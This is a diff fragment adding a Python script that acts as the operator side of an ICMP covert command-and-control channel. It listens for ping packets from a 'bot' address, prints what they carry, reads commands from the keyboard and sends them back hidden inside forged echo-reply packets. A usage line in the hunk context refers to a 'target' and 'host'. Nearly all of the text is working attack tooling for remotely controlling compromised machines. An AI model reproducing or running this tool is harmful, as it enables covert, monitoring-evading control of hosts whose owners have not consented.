@@ -109,3 +109,74 @@ if __name__ == '__main__':
         print('[+] Usage: sudo {} [ target ] [ host ]')
         exit()
     main(argv[1], argv[2])
+=========================================================================================================
+
+from socket import socket, AF_INET, SOCK_RAW, \
+    IPPROTO_ICMP, IPPROTO_IP, IP_HDRINCL
+from scapy import *
+from select import select
+from impacket import ImpactPacket, ImpactDecoder
+from sys import exit, stdin, stdout
+
+'''
+def sendPingResponse(dstIP, packetId, icmpId, command, seqId):
+    # printLine("[*] Creating response for using command=%s" %s (str(command)), flag)
+    resp = IP(dst=dstIP, id=packetId) / ICMP(type="echo-reply", id=icmpId, seq=seqId) / str(command)
+    # resp.show2()
+    send(resp)
+    print("[+] Response sent!")
+'''
+
+botip = '127.0.0.1'
+
+s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
+s.setblocking(0)
+s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+ip = ImpactPacket.IP()
+ip.set_ip_dst(botip) # bots ip. client?
+icmp = ImpactPacket.ICMP()
+icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)
+decoder = ImpactDecoder.IPDecoder()
+
+print('[+] Listening...')
+cmd = ''
+count = 0
+while 1:
+    if s in select([s], [], [])[0]:
+        stuff = s.recv(4096)
+    if len(stuff) == 0:
+        print('[!] Socket closed!')
+        s.close()
+        exit(0)
+
+    ippacket = decoder.decode(stuff)
+    icmppacket = ippacket.child()
+
+    if ippacket.get_ip_src() == botip and 8 == icmppacket.get_icmp_type():
+        ip_ident = ippacket.get_ip_id()
+        ident = icmppacket.get_icmp_id()
+        seq_id = icmppacket.get_icmp_seq()
+        data = icmppacket.get_data_as_string()
+        print('[+] Received: {}'.format(data))
+        if len(data) > 0:
+            stdout.write(data)
+            stdout.flush()
+        try:
+            cmd = stdin.readline()
+            stdout.flush()
+            print('[+] The command is: {}'.format(cmd))
+        except Exception as e:
+            print('[!] Uh-oh! {}'.format(e))
+
+        ip.set_ip_id(ip_ident)
+        icmp.set_icmp_id(ident)
+        icmp.set_icmp_seq(seq_id)
+        icmp.contains(ImpactPacket.Data(cmd))
+        icmp.set_icmp_cksum(0)
+        icmp.auto_checksum = 1
+        ip.contains(icmp)
+        s.sendto(ip.get_packet(), (botip, 0))
+
+        if cmd == 'exit':
+            s.close()
+            break
